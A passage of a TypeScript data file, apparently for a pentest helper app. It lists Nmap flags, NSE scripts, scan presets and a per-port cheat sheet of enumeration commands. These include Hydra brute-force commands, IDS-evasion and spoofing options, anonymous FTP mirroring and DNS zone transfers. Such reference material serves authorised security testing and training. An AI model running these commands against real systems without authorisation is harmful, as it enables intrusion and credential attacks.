

import { FlagDef, ScriptDef, PresetDef, ServiceItem, OsintTopic, WebEnumTopic, AdEnumTopic, ExploitTopic, AdReconTopic, InfiltrationTopic, AdAttackTopic, WebShellTopic, ShellTopic, OsFingerprintTopic } from './types';

export const FLAGS: FlagDef[] = [
  // Basic
  { flag: '-p-', label: 'All Ports (-p-)', description: 'Scan all 65535 ports', category: 'basic_port' },
  { flag: '-F', label: 'Fast (-F)', description: 'Top 100 ports', category: 'basic_port' },
  { flag: '--top-ports', label: 'Top N Ports', description: 'Scan most common N ports', hasInput: true, placeholder: '100', category: 'basic_port' },
  { flag: '-p', label: 'Specific Ports', description: 'Custom port list', hasInput: true, placeholder: '22,80,443', category: 'basic_port' },
  { flag: '-r', label: 'Sequential (-r)', description: "Don't randomize ports", category: 'basic_port' },
  
  { flag: '-sV', label: 'Service Version (-sV)', description: 'Probe for service versions', category: 'basic_detect' },
  { flag: '-O', label: 'OS Detection (-O)', description: 'Enable OS detection', category: 'basic_detect' },
  { flag: '-A', label: 'Aggressive (-A)', description: 'OS + version + script + traceroute', category: 'basic_detect' },
  { flag: '-sC', label: 'Default Scripts (-sC)', description: 'Run default NSE scripts', category: 'basic_detect' },
  { flag: '--version-intensity', label: 'Version Intensity', description: '0=light, 9=all probes', hasInput: true, placeholder: '7', category: 'basic_detect' },

  { flag: '-T0', label: 'T0 - Paranoid', description: 'IDS evasion, very slow', category: 'basic_timing' },
  { flag: '-T1', label: 'T1 - Sneaky', description: 'IDS evasion, slow', category: 'basic_timing' },
  { flag: '-T2', label: 'T2 - Polite', description: 'Less bandwidth', category: 'basic_timing' },
  { flag: '-T3', label: 'T3 - Normal', description: 'Default timing', category: 'basic_timing' },
  { flag: '-T4', label: 'T4 - Aggressive', description: 'Fast, reasonably reliable', category: 'basic_timing' },
  { flag: '-T5', label: 'T5 - Insane', description: 'Very fast, may miss ports', category: 'basic_timing' },

  // Discovery
  { flag: '-sn', label: 'Ping Scan (-sn)', description: 'No port scan, discovery only', category: 'discovery_host' },
  { flag: '-Pn', label: 'Skip Discovery (-Pn)', description: 'Treat all hosts as online', category: 'discovery_host' },
  { flag: '-PE', label: 'ICMP Echo (-PE)', description: 'ICMP echo request discovery', category: 'discovery_host' },
  { flag: '-PP', label: 'ICMP Timestamp (-PP)', description: 'ICMP timestamp request', category: 'discovery_host' },
  { flag: '-PM', label: 'ICMP Netmask (-PM)', description: 'ICMP netmask request', category: 'discovery_host' },
  { flag: '-PR', label: 'ARP Ping (-PR)', description: 'ARP discovery (local)', category: 'discovery_host' },
  { flag: '--disable-arp-ping', label: 'Disable ARP', description: 'No ARP or ND ping', category: 'discovery_host' },
  { flag: '-PS', label: 'TCP SYN Ping', description: 'SYN discovery', hasInput: true, placeholder: '22,80', category: 'discovery_host' },
  { flag: '-PA', label: 'TCP ACK Ping', description: 'ACK discovery', hasInput: true, placeholder: '80', category: 'discovery_host' },
  { flag: '-PU', label: 'UDP Ping', description: 'UDP discovery', hasInput: true, placeholder: '53', category: 'discovery_host' },

  { flag: '-n', label: 'No DNS (-n)', description: 'Never do DNS resolution', category: 'discovery_dns' },
  { flag: '-R', label: 'DNS All (-R)', description: 'Always resolve DNS', category: 'discovery_dns' },
  { flag: '--system-dns', label: 'System DNS', description: 'Use OS DNS resolver', category: 'discovery_dns' },
  { flag: '--dns-servers', label: 'Custom DNS', description: 'Use specific DNS servers', hasInput: true, placeholder: '8.8.8.8', category: 'discovery_dns' },
  { flag: '--traceroute', label: 'Traceroute', description: 'Trace path to hosts', category: 'discovery_dns' },

  // Scan Types
  { flag: '-sS', label: 'SYN Stealth (-sS)', description: 'Default, stealthy half-open', category: 'scan_tcp' },
  { flag: '-sT', label: 'TCP Connect (-sT)', description: 'Full connection scan', category: 'scan_tcp' },
  { flag: '-sA', label: 'ACK Scan (-sA)', description: 'Firewall rule mapping', category: 'scan_tcp' },
  { flag: '-sW', label: 'Window Scan (-sW)', description: 'TCP window analysis', category: 'scan_tcp' },
  { flag: '-sM', label: 'Maimon (-sM)', description: 'FIN/ACK scan', category: 'scan_tcp' },
  { flag: '-sN', label: 'NULL (-sN)', description: 'No flags set', category: 'scan_tcp' },
  { flag: '-sF', label: 'FIN (-sF)', description: 'FIN flag only', category: 'scan_tcp' },
  { flag: '-sX', label: 'Xmas (-sX)', description: 'FIN+PSH+URG flags', category: 'scan_tcp' },

  { flag: '-sU', label: 'UDP Scan (-sU)', description: 'UDP port scan', category: 'scan_other' },
  { flag: '-sO', label: 'IP Protocol (-sO)', description: 'Scan IP protocols', category: 'scan_other' },
  { flag: '-sY', label: 'SCTP INIT (-sY)', description: 'SCTP INIT scan', category: 'scan_other' },
  { flag: '-sZ', label: 'SCTP COOKIE (-sZ)', description: 'SCTP COOKIE-ECHO', category: 'scan_other' },
  { flag: '--scanflags', label: 'Custom Flags', description: 'Custom TCP flags', hasInput: true, placeholder: 'URGACK', category: 'scan_other' },
  { flag: '-sI', label: 'Idle/Zombie', description: 'Idle scan via zombie', hasInput: true, placeholder: 'zombie:port', category: 'scan_other' },

  // Timing
  { flag: '--min-rate', label: 'Min Rate', description: 'Minimum packets/sec', hasInput: true, placeholder: '100', category: 'timing_rate' },
  { flag: '--max-rate', label: 'Max Rate', description: 'Maximum packets/sec', hasInput: true, placeholder: '1000', category: 'timing_rate' },
  { flag: '--min-parallelism', label: 'Min Parallelism', description: 'Min parallel probes', hasInput: true, placeholder: '10', category: 'timing_rate' },
  { flag: '--max-parallelism', label: 'Max Parallelism', description: 'Max parallel probes', hasInput: true, placeholder: '100', category: 'timing_rate' },

  { flag: '--host-timeout', label: 'Host Timeout', description: 'Give up after time', hasInput: true, placeholder: '30m', category: 'timing_timeout' },
  { flag: '--scan-delay', label: 'Scan Delay', description: 'Delay between probes', hasInput: true, placeholder: '1s', category: 'timing_timeout' },
  { flag: '--max-scan-delay', label: 'Max Scan Delay', description: 'Max delay adjustment', hasInput: true, placeholder: '10s', category: 'timing_timeout' },
  { flag: '--max-retries', label: 'Max Retries', description: 'Port probe retries', hasInput: true, placeholder: '3', category: 'timing_timeout' },
  { flag: '--initial-rtt-timeout', label: 'Initial RTT', description: 'Initial probe timeout', hasInput: true, placeholder: '500ms', category: 'timing_timeout' },
  { flag: '--max-rtt-timeout', label: 'Max RTT', description: 'Max probe timeout', hasInput: true, placeholder: '10s', category: 'timing_timeout' },
  
  { flag: '--min-hostgroup', label: 'Min Host Group', description: 'Min parallel hosts', hasInput: true, placeholder: '50', category: 'timing_group' },
  { flag: '--max-hostgroup', label: 'Max Host Group', description: 'Max parallel hosts', hasInput: true, placeholder: '100', category: 'timing_group' },
  { flag: '--defeat-rst-ratelimit', label: 'Defeat RST Limit', description: 'Ignore RST rate limiting', category: 'timing_group' },
  { flag: '--defeat-icmp-ratelimit', label: 'Defeat ICMP Limit', description: 'Ignore ICMP rate limiting', category: 'timing_group' },

  // Evasion
  { flag: '-f', label: 'Fragment (-f)', description: '8-byte IP fragments', category: 'evasion_frag' },
  { flag: '-ff', label: 'More Fragments (-ff)', description: '16-byte fragments', category: 'evasion_frag' },
  { flag: '--mtu', label: 'Custom MTU', description: 'Set MTU (multiple of 8)', hasInput: true, placeholder: '24', category: 'evasion_frag' },
  { flag: '--data-length', label: 'Random Data', description: 'Append random bytes', hasInput: true, placeholder: '25', category: 'evasion_frag' },

  { flag: '-D', label: 'Decoys', description: 'Cloak with decoy IPs', hasInput: true, placeholder: 'RND:5,ME', category: 'evasion_spoof' },
  { flag: '-S', label: 'Spoof Source IP', description: 'Spoof source address', hasInput: true, placeholder: '192.168.1.100', category: 'evasion_spoof' },
  { flag: '-g', label: 'Source Port', description: 'Use specific source port', hasInput: true, placeholder: '53', category: 'evasion_spoof' },
  { flag: '--spoof-mac', label: 'Spoof MAC', description: 'Spoof MAC address', hasInput: true, placeholder: 'Dell', category: 'evasion_spoof' },
  { flag: '-e', label: 'Interface', description: 'Use specific interface', hasInput: true, placeholder: 'eth0', category: 'evasion_spoof' },

  { flag: '--ttl', label: 'TTL', description: 'Set IP time-to-live', hasInput: true, placeholder: '64', category: 'evasion_route' },
  { flag: '--proxies', label: 'Proxy Chain', description: 'Relay via proxies', hasInput: true, placeholder: 'socks4://127.0.0.1:9050', category: 'evasion_route' },
  { flag: '--badsum', label: 'Bad Checksum', description: 'Send with bad checksum', category: 'evasion_route' },
  { flag: '--ip-options', label: 'IP Options', description: 'Set IP options', hasInput: true, placeholder: 'S', category: 'evasion_route' },

  // Output
  { flag: '-oA', label: 'All Formats (-oA)', description: 'Normal + XML + Greppable', hasInput: true, placeholder: 'scan_output', category: 'output_fmt' },
  { flag: '-oN', label: 'Normal (-oN)', description: 'Normal output file', hasInput: true, placeholder: 'scan.txt', category: 'output_fmt' },
  { flag: '-oX', label: 'XML (-oX)', description: 'XML output file', hasInput: true, placeholder: 'scan.xml', category: 'output_fmt' },
  { flag: '-oG', label: 'Greppable (-oG)', description: 'Greppable output', hasInput: true, placeholder: 'scan.gnmap', category: 'output_fmt' },

  { flag: '-v', label: 'Verbose (-v)', description: 'Increase verbosity', category: 'output_verb' },
  { flag: '-vv', label: 'Very Verbose (-vv)', description: 'Even more output', category: 'output_verb' },
  { flag: '-d', label: 'Debug (-d)', description: 'Enable debugging', category: 'output_verb' },
  { flag: '--reason', label: 'Show Reason', description: 'Show port state reason', category: 'output_verb' },
  { flag: '--open', label: 'Open Only', description: 'Only show open ports', category: 'output_verb' },
  { flag: '--packet-trace', label: 'Packet Trace', description: 'Show all packets', category: 'output_verb' },
];

export const SCRIPTS: ScriptDef[] = [
  // Vuln
  { name: 'smb-vuln-ms17-010', description: 'EternalBlue check', category: 'vuln' },
  { name: 'smb-vuln-ms08-067', description: 'Netapi RCE', category: 'vuln' },
  { name: 'ssl-heartbleed', description: 'Heartbleed CVE-2014-0160', category: 'vuln' },
  { name: 'ssl-poodle', description: 'POODLE CVE-2014-3566', category: 'vuln' },
  { name: 'http-shellshock', description: 'Shellshock CVE-2014-6271', category: 'vuln' },
  { name: 'http-vuln-cve2017-5638', description: 'Apache Struts RCE', category: 'vuln' },
  { name: 'vulners', description: 'Query Vulners database', category: 'vuln' },
  { name: 'ftp-vsftpd-backdoor', description: 'vsftpd 2.3.4 backdoor', category: 'vuln' },
  { name: 'http-sql-injection', description: 'SQL injection detection', category: 'vuln' },
  { name: 'rdp-vuln-ms12-020', description: 'RDP DoS MS12-020', category: 'vuln' },
  
  // SMB
  { name: 'smb-enum-shares', description: 'Enumerate shares', category: 'smb' },
  { name: 'smb-enum-users', description: 'Enumerate users', category: 'smb' },
  { name: 'smb-enum-sessions', description: 'Active sessions', category: 'smb' },
  { name: 'smb-os-discovery', description: 'OS via SMB', category: 'smb' },
  { name: 'smb-protocols', description: 'SMB protocol versions', category: 'smb' },
  { name: 'smb-security-mode', description: 'SMB security config', category: 'smb' },
  { name: 'smb-enum-domains', description: 'Enumerate domains', category: 'smb' },
  { name: 'smb-enum-groups', description: 'Enumerate groups', category: 'smb' },

  // HTTP
  { name: 'http-enum', description: 'Enumerate directories', category: 'http' },
  { name: 'http-headers', description: 'HTTP headers', category: 'http' },
  { name: 'http-methods', description: 'Enumerate methods', category: 'http' },
  { name: 'http-title', description: 'Get page title', category: 'http' },
  { name: 'http-robots.txt', description: 'Parse robots.txt', category: 'http' },
  { name: 'http-git', description: 'Exposed .git', category: 'http' },
  { name: 'http-wordpress-enum', description: 'WordPress enumeration', category: 'http' },
  { name: 'http-waf-detect', description: 'WAF detection', category: 'http' },

  // SSL
  { name: 'ssl-enum-ciphers', description: 'Enumerate ciphers', category: 'ssl' },
  { name: 'ssl-cert', description: 'Get certificate', category: 'ssl' },
  { name: 'ssl-dh-params', description: 'DH parameter analysis', category: 'ssl' },
  { name: 'ssl-ccs-injection', description: 'CCS Injection', category: 'ssl' },
  { name: 'sslv2-drown', description: 'DROWN attack', category: 'ssl' },
  { name: 'tls-ticketbleed', description: 'Ticketbleed CVE-2016-9244', category: 'ssl' },

  // Brute
  { name: 'ssh-brute', description: 'SSH brute force', category: 'brute' },
  { name: 'ftp-brute', description: 'FTP brute force', category: 'brute' },
  { name: 'http-brute', description: 'HTTP auth brute', category: 'brute' },
  { name: 'smb-brute', description: 'SMB brute force', category: 'brute' },
  { name: 'mysql-brute', description: 'MySQL brute force', category: 'brute' },
  { name: 'ftp-anon', description: 'Anonymous FTP', category: 'brute' },
  { name: 'smtp-enum-users', description: 'SMTP user enum', category: 'brute' },

  // DNS
  { name: 'dns-brute', description: 'Subdomain brute', category: 'dns' },
  { name: 'dns-zone-transfer', description: 'Zone transfer', category: 'dns' },
  { name: 'dns-recursion', description: 'Recursion test', category: 'dns' },
  { name: 'dns-srv-enum', description: 'SRV record enum', category: 'dns' },
];

export const PRESETS: PresetDef[] = [
  { 
    id: 'quick', label: 'Quick Recon', description: 'Top 100 + version + scripts', icon: 'fa-bolt', 
    flags: ['--top-ports', '-sV', '-sC', '-T4', '-oA'], 
    values: { '--top-ports': '100', '-oA': 'scan_quick' } 
  },
  { 
    id: 'full', label: 'Full TCP', description: 'All 65535 ports', icon: 'fa-expand', 
    flags: ['-p-', '-sV', '-sC', '-T4', '-oA'], 
    values: { '-oA': 'scan_full' } 
  },
  { 
    id: 'udp', label: 'Full UDP', description: 'Top 50 UDP ports', icon: 'fa-expand-arrows-alt', 
    flags: ['-sU', '-sV', '-T4'], 
    values: {} 
  },
  { 
    id: 'stealth', label: 'Stealth', description: 'IDS evasion mode', icon: 'fa-user-ninja', 
    flags: ['-sS', '-Pn', '-n', '-T1', '-p-', '-f', '--max-rate'], 
    values: { '--max-rate': '10' } 
  },
  { 
    id: 'vuln', label: 'Vuln Scan', description: 'Vulnerability scripts', icon: 'fa-bug', 
    flags: ['-p-', '-sV', '-T4'], 
    values: {},
    scripts: ['vuln'] // Category reference
  },
  { 
    id: 'web', label: 'Web Focus', description: 'HTTP/HTTPS enum', icon: 'fa-globe', 
    flags: ['-p', '-sV', '-sC', '-T4'], 
    values: { '-p': '80,443,8080,8443' },
    scripts: ['http']
  },
  { 
    id: 'smb', label: 'SMB Full', description: 'SMB enumeration', icon: 'fa-server', 
    flags: ['-p', '-sV', '-T4'], 
    values: { '-p': '139,445' },
    scripts: ['smb']
  },
  { 
    id: 'ad', label: 'AD Enum', description: 'Active Directory', icon: 'fa-sitemap', 
    flags: ['-p', '-sV', '-sC', '-T4'], 
    values: { '-p': '53,88,135,139,389,445,464,636,3268,3269' } 
  },
  { 
    id: 'ssl', label: 'SSL Audit', description: 'TLS/SSL testing', icon: 'fa-lock', 
    flags: ['-p', '-sV', '-T4'], 
    values: { '-p': '443,8443,993,995,465,636' },
    scripts: ['ssl']
  },
  { 
    id: 'db', label: 'Database', description: 'DB enumeration', icon: 'fa-database', 
    flags: ['-p', '-sV', '-T4'], 
    values: { '-p': '1433,1521,3306,5432,27017,6379' }
  },
  { 
    id: 'firewall', label: 'Firewall Probe', description: 'ACK + Window scan', icon: 'fa-shield-alt', 
    flags: ['-sA', '-sW', '-p-', '--reason', '-T4'], 
    values: {} 
  },
  { 
    id: 'os', label: 'OS Fingerprint', description: 'Aggressive OS detection', icon: 'fa-fingerprint', 
    flags: ['-O', '-sV', '-p-', '-T4'], 
    values: {} 
  },
];

export const SERVICES: ServiceItem[] = [
  {
    port: 21,
    protocol: 'TCP',
    name: 'FTP',
    description: 'File Transfer Protocol',
    whatToLookFor: [
      'Anonymous Login: (user: anonymous, pass: anonymous)',
      'Writable Directories: Look for "pub", "uploads", etc.',
      'Sensitive Files: Check for credentials, backups, or source code.',
      'Banner Grabbing: Version info for CVE search (e.g., vsftpd 2.3.4, ProFTPD 1.3.5).',
      'FTP Bounce: Is the server vulnerable to PORT command misuse?'
    ],
    tools: [
      {
        name: 'FTP Client',
        description: 'Standard FTP client',
        commands: [{ label: 'Connect', code: 'ftp <TARGET>' }]
      },
      {
        name: 'Wget',
        description: 'Recursive file download',
        commands: [{ label: 'Mirror FTP', code: 'wget -m --no-passive ftp://anonymous:anonymous@<TARGET>' }]
      },
      {
        name: 'Nmap',
        description: 'FTP Scripts',
        commands: [
          { label: 'Anon Check', code: 'nmap --script=ftp-anon -p 21 <TARGET>' },
          { label: 'All FTP Scripts', code: 'nmap --script=ftp-* -p 21 <TARGET>' }
        ]
      },
      {
        name: 'Hydra',
        description: 'Brute Force',
        commands: [
          { label: 'Brute Force', code: 'hydra -L <USER_LIST> -P <PASS_LIST> -f <TARGET> ftp' }
        ]
      }
    ]
  },
  {
    port: 22,
    protocol: 'TCP',
    name: 'SSH',
    description: 'Secure Shell',
    whatToLookFor: [
      'Weak Credentials: Root login enabled? Default passwords?',
      'Old Versions: libssh auth bypass (CVE-2018-10933), OpenSSH user enumeration.',
      'Key Misconfiguration: Private keys left in accessible directories.',
      'Banner Grabbing: Identifies OS version (e.g., Ubuntu/Debian versions).',
      'Port Forwarding: Can be used to tunnel traffic if credentials are found.'
    ],
    tools: [
      {
        name: 'SSH Client',
        description: 'Connect',
        commands: [{ label: 'Connect', code: 'ssh <USER>@<TARGET>' }]
      },
      {
        name: 'Netcat',
        description: 'Banner Grabbing',
        commands: [{ label: 'Banner', code: 'nc -vn <TARGET> 22' }]
      },
      {
        name: 'Nmap',
        description: 'SSH Scripts',
        commands: [{ label: 'Enum Algos', code: 'nmap --script ssh2-enum-algos -p 22 <TARGET>' }]
      },
      {
        name: 'Hydra',
        description: 'Brute Force',
        commands: [
          { label: 'Brute Force', code: 'hydra -L <USER_LIST> -P <PASS_LIST> -f <TARGET> ssh' }
        ]
      }
    ]
  },
  {
    port: 23,
    protocol: 'TCP',
    name: 'Telnet',
    description: 'Unencrypted Remote Terminal',
    whatToLookFor: [
      'Cleartext Credentials: All traffic is unencrypted (sniffing risk).',
      'No Authentication: Sometimes drops directly into a shell.',
      'Banner Grabbing: Device type, OS version, or internal info.',
      'Brute Force: Often weak default passwords (admin/admin, root/toor).'
    ],
    tools: [
        {
            name: 'Telnet',
            description: 'Connect',
            commands: [{ label: 'Connect', code: 'telnet <TARGET>' }]
        },
        {
            name: 'Nmap',
            description: 'Telnet Scripts',
            commands: [{ label: 'Scripts', code: 'nmap -p 23 --script telnet-* <TARGET>' }]
        }
    ]
  },
  {
    port: 25,
    protocol: 'TCP',
    name: 'SMTP',
    description: 'Simple Mail Transfer Protocol',
    whatToLookFor: [
      'User Enumeration: VRFY, EXPN, and RCPT TO commands.',
      'Open Relay: Allows sending emails to external domains (spam/phishing).',
      'Banner Info: Hostname, software version (Postfix, Exim, Exchange).',
      'Authentication: Does it support AUTH PLAIN/LOGIN? Brute force targets.',
      'Spoofing: Lack of SPF/DKIM/DMARC records.'
    ],
    tools: [
        {
            name: 'Netcat',
            description: 'Manual Interaction',
            commands: [{ label: 'Connect', code: 'nc -nv <TARGET> 25' }]
        },
        {
            name: 'Nmap',
            description: 'SMTP Scripts',
            commands: [
                { label: 'Enum Users', code: 'nmap -p 25 --script smtp-enum-users <TARGET>' },
                { label: 'Open Relay', code: 'nmap -p 25 --script smtp-open-relay <TARGET>' }
            ]
        },
        {
            name: 'Swaks',
            description: 'Swiss Army Knife for SMTP',
            commands: [{ label: 'Test Email', code: 'swaks --to <EMAIL> --from test@example.com --server <TARGET>' }]
        },
        {
            name: 'Hydra',
            description: 'Brute Force',
            commands: [{ label: 'Brute Force', code: 'hydra -L <USER_LIST> -P <PASS_LIST> <TARGET> smtp' }]
        }
    ]
  },
  {
    port: 53,
    protocol: 'TCP/UDP',
    name: 'DNS',
    description: 'Domain Name System',
    whatToLookFor: [
      'Zone Transfer (AXFR): Dumps all records for the domain.',
      'Recursion Enabled: Can be used for DDoS amplification.',
      'Version Info: CHAOS class queries (version.bind).',
      'Internal IP Disclosure: Check for private IPs in records.',
      'Subdomains: Bruteforce to find hidden services (dev, staging, admin).'
    ],
    tools: [
        {
            name: 'Dig',
            description: 'DNS Lookup',
            commands: [
                { label: 'Zone Transfer', code: 'dig axfr @<TARGET> <DOMAIN>' },
                { label: 'Any Record', code: 'dig any @<TARGET> <DOMAIN>' }
            ]
        },
        {
            name: 'Nmap',
            description: 'DNS Scripts',
            commands: [{ label: 'Enum', code: 'nmap -p 53 --script dns-zone-transfer,dns-recursion <TARGET>' }]
        },
        {
            name: 'DNSRecon',
            description: 'DNS Enumeration Script',
            commands: [{ label: 'Scan', code: 'dnsrecon -d <DOMAIN> -n <TARGET>' }]
        }
    ]
  },
  {
    port: 69,
    protocol: 'UDP',
    name: 'TFTP',
    description: 'Trivial File Transfer Protocol',
    whatToLookFor: [
      'No Authentication: TFTP does not support login.',
      'File Guessing: Must know the exact filename to download.',
      'Config Files: Look for router configs, backup files, etc.',
      'Write Access: Can you upload a malicious file?'
    ],
    tools: [
        {
            name: 'Nmap',
            description: 'TFTP Scripts',
            commands: [{ label: 'Enum', code: 'nmap -sU -p 69 --script tftp-enum <TARGET>' }]
        },
        {
            name: 'TFTP Client',
            description: 'Connect',
            commands: [{ label: 'Connect', code: 'tftp <TARGET>' }]
        }
    ]
  },
  {
    port: 79,
    protocol: 'TCP',
    name: 'Finger',
    description: 'User Information Protocol',
    whatToLookFor: [
      'User Enumeration: Lists logged-in users and their details.',
      'Information Leakage: Home directories, last login times, mail status.',
      'Buffer Overflows: Ancient finger daemons often had RCE vulns.'
    ],
    tools: [
        {
            name: 'Finger-user-enum',
            description: 'Enumerate Users',
            commands: [{ label: 'Scan', code: 'finger-user-enum.pl -U <USER_LIST> -t <TARGET>' }]
        },
        {
            name: 'Nmap',
            description: 'Finger Scripts',
            commands: [{ label: 'Enum', code: 'nmap -p 79 --script finger <TARGET>' }]
        }
    ]
  },
  {
    port: 80,
    protocol: 'TCP',
    name: 'HTTP',
    description: 'Web Server',
    whatToLookFor: [
      'Robots.txt & Sitemap.xml: Hidden paths.',
      'Headers: Server version, X-Powered-By, CORS configuration.',
      'Directories: /admin, /backup, /config, /uploads, /.git.',
      'Vulnerabilities: SQLi, XSS, LFI, RCE, IDOR.',
      'Default Credentials: Tomcat, Jenkins, WordPress, etc.'
    ],
    tools: [
        {
            name: 'Gobuster',
            description: 'Directory Brute Force',
            commands: [{ label: 'Dir Scan', code: 'gobuster dir -u http://<TARGET> -w <WORDLIST>' }]
        },
        {
            name: 'Nikto',
            description: 'Vuln Scanner',
            commands: [{ label: 'Scan', code: 'nikto -h http://<TARGET>' }]
        },
        {
            name: 'Nmap',
            description: 'HTTP Scripts',
            commands: [{ label: 'Enum', code: 'nmap -p 80 --script http-enum,http-title,http-headers <TARGET>' }]
        }
    ]
  },
  {
    port: 88,
    protocol: 'TCP',
    name: 'Kerberos',
    description: 'Authentication Protocol',
    whatToLookFor: [
      'User Enumeration: Validating usernames via Kerberos errors.',
      'AS-REP Roasting: Users with "Do not require Kerberos preauthentication".',
      'Kerberoasting: Service accounts with SPNs (Service Principal Names).',
      'Pass-the-Ticket: Reusing stolen TGT/TGS tickets.',
      'Golden/Silver Tickets: Forging tickets (Post-Exploitation).'
    ],
    tools: [
        {
            name: 'Kerbrute',
            description: 'User Enum',
            commands: [{ label: 'User Enum', code: './kerbrute userenum -d <DOMAIN> --dc <TARGET> <USER_LIST>' }]
        },
        {
            name: 'Nmap',
            description: 'Kerberos Scripts',
            commands: [{ label: 'Enum', code: 'nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=<DOMAIN> <TARGET>' }]
        }
    ]
  },
  {
    port: 110,
    protocol: 'TCP',
    name: 'POP3',
    description: 'Post Office Protocol',
    whatToLookFor: [
      'Cleartext Auth: Sniffing credentials.',
      'Brute Force: Guessing user passwords.',
      'Email Content: Reading sensitive emails if access is gained.'
    ],
    tools: [
        {
            name: 'Netcat',
            description: 'Connect',
            commands: [{ label: 'Connect', code: 'nc -nv <TARGET> 110' }]
        },
        {
            name: 'Hydra',
            description: 'Brute Force',
            commands: [{ label: 'Brute Force', code: 'hydra -L <USER_LIST> -P <PASS_LIST> -f <TARGET> pop3' }]
        },
        {
            name: 'OpenSSL',
            description: 'POP3S (995)',
            commands: [{ label: 'Connect SSL', code: 'openssl s_client -connect <TARGET>:995 -crlf' }]
        }
    ]
  },
  {
    port: 111,
    protocol: 'TCP/UDP',
    name: 'RPCBind',
    description: 'Remote Procedure Call',
    whatToLookFor: [
      'Exposed Services: NFS, NIS, Mountd, Statd.',
      'Program Versions: Finding vulnerable RPC programs.',
      'NFS Exports: Determining if file shares are available.'
    ],
    tools: [
        {
            name: 'Rpcinfo',
            description: 'Dump RPC',
            commands: [{ label: 'Dump', code: 'rpcinfo -p <TARGET>' }]
        },
        {
            name: 'Nmap',
            description: 'RPC Scripts',
            commands: [{ label: 'Enum', code: 'nmap -sV -p 111 --script rpcinfo <TARGET>' }]
        }
    ]
  },
  {
    port: 139,
    protocol: 'TCP',
    name: 'NetBIOS',
    description: 'Network Basic Input/Output System',
    whatToLookFor: [
      'Null Sessions: Connecting without credentials.',
      'Information: Hostname, Workgroup/Domain name, MAC address.',
      'User List: Enumerating users via RID cycling.'
    ],
    tools: [
        {
            name: 'Nbtscan',
            description: 'Scan NetBIOS',
            commands: [{ label: 'Scan', code: 'nbtscan <TARGET>' }]
        },
        {
            name: 'Enum4Linux',
            description: 'Enum Windows Info',
            commands: [{ label: 'Enum', code: 'enum4linux -a <TARGET>' }]
        }
    ]
  },
  {
    port: 143,
    protocol: 'TCP',
    name: 'IMAP',
    description: 'Internet Message Access Protocol',
    whatToLookFor: [
      'Capability Check: Does it support IMAP4rev1? SASL auth methods?',
      'Cleartext Auth: Avoid LOGIN if STARTTLS is not enforced.',
      'Information Leakage: Software version (Dovecot, Exchange).'
    ],
    tools: [
        {
            name: 'Hydra',
            description: 'Brute Force',
            commands: [{ label: 'Brute Force', code: 'hydra -L <USER_LIST> -P <PASS_LIST> -f <TARGET> imap' }]
        },
        {
            name: 'OpenSSL',
            description: 'IMAPS (993)',
            commands: [{ label: 'Connect SSL', code: 'openssl s_client -connect <TARGET>:993 -crlf' }]
        }
    ]
  },
  {
    port: 161,
    protocol: 'UDP',
    name: 'SNMP',
    description: 'Simple Network Management Protocol',
    whatToLookFor: [
      'Community Strings: public (read-only), private (read-write), manager.',
      'System Info: OS, Kernel, hostname, uptime.',
      'Network Info: Interfaces, IP addresses, ARP table, Routing table.',
      'Processes/Software: Installed software, running processes.',
      'Write Access: Can you modify configurations (e.g., upload files)?'
    ],
    tools: [
        {
            name: 'Snmpwalk',
            description: 'Walk MIB',
            commands: [{ label: 'Walk (v2c)', code: 'snmpwalk -v2c -c public <TARGET>' }]
        },
        {
            name: 'Onesixtyone',
            description: 'Brute Force Community Strings',
            commands: [{ label: 'Brute', code: 'onesixtyone -c /usr/share/doc/onesixtyone/dict.txt <TARGET>' }]
        },
        {
            name: 'SNMP-Check',
            description: 'Comprehensive Scan',
            commands: [{ label: 'Scan', code: 'snmp-check <TARGET>' }]
        }
    ]
  },
  {
    port: 389,
    protocol: 'TCP',
    name: 'LDAP',
    description: 'Lightweight Directory Access Protocol',
    whatToLookFor: [
      'Anonymous Bind: Reading directory data without auth.',
      'Naming Contexts: Identifying the Domain components (dc=htb,dc=local).',
      'User Enumeration: Getting a list of valid domain users.',
      'Pass Spraying: Testing one password against all users.',
      'Sensitive Data: Description fields often contain passwords.'
    ],
    tools: [
        {
            name: 'Ldapsearch',
            description: 'Query LDAP',
            commands: [
                { label: 'Naming Contexts', code: 'ldapsearch -x -H ldap://<TARGET> -s base namingContexts' },
                { label: 'Dump All', code: 'ldapsearch -x -H ldap://<TARGET> -b "DC=<DOMAIN>,DC=LOCAL"' }
            ]
        },
        {
            name: 'Windapsearch',
            description: 'AD Enumeration Tool',
            commands: [
                { label: 'Users', code: './windapsearch.py -d <DOMAIN> -u <USER> -p <PASS> --da' },
                { label: 'Computers', code: './windapsearch.py -d <DOMAIN> -u <USER> -p <PASS> --computers' }
            ]
        },
        {
            name: 'Nmap',
            description: 'LDAP Scripts',
            commands: [{ label: 'Enum', code: 'nmap -p 389 --script ldap-search <TARGET>' }]
        }
    ]
  },
  {
    port: 443,
    protocol: 'TCP',
    name: 'HTTPS',
    description: 'Secure Web Server',
    whatToLookFor: [
      'Heartbleed: OpenSSL memory leakage (CVE-2014-0160).',
      'Shellshock: CGI vulnerability (CVE-2014-6271).',
      'Weak Ciphers: SSLv2/v3 support (POODLE, DROWN).',
      'Certificate Info: Common Name (CN) and Subject Alternative Names (SAN) for host discovery.',
      'Web App Vulns: Same as HTTP (SQLi, XSS, RCE, etc.).'
    ],
    tools: [
        {
            name: 'SSLScan',
            description: 'SSL/TLS Scanner',
            commands: [{ label: 'Scan', code: 'sslscan <TARGET>' }]
        },
        {
            name: 'Nmap',
            description: 'SSL Scripts',
            commands: [{ label: 'Enum', code: 'nmap -p 443 --script ssl-enum-ciphers,ssl-heartbleed <TARGET>' }]
        },
        {
            name: 'Nikto',
            description: 'Web Scanner',
            commands: [{ label: 'Scan', code: 'nikto -h https://<TARGET>' }]
        }
    ]
  },
  {
    port: 445,
    protocol: 'TCP',
    name: 'SMB',
    description: 'Server Message Block',
    whatToLookFor: [
      'Null Session: Listing shares/users without auth.',
      'Shares: Readable/Writable shares (C$, ADMIN$, IPC$, backups).',
      'Signing: Is SMB Signing required? If not, Relay attacks are possible.',
      'Vulnerabilities: EternalBlue (MS17-010), SMBGhost (CVE-2020-0796).',
      'User Enumeration: RID Cycling to find users.'
    ],
    tools: [
        {
            name: 'Smbclient',
            description: 'List Shares',
            commands: [
                { label: 'List (Null)', code: 'smbclient -L //<TARGET> -N' },
                { label: 'List (Auth)', code: 'smbclient -L //<TARGET> -U <USER>' }
            ]
        },
        {
            name: 'Smbmap',
            description: 'Permission Check',
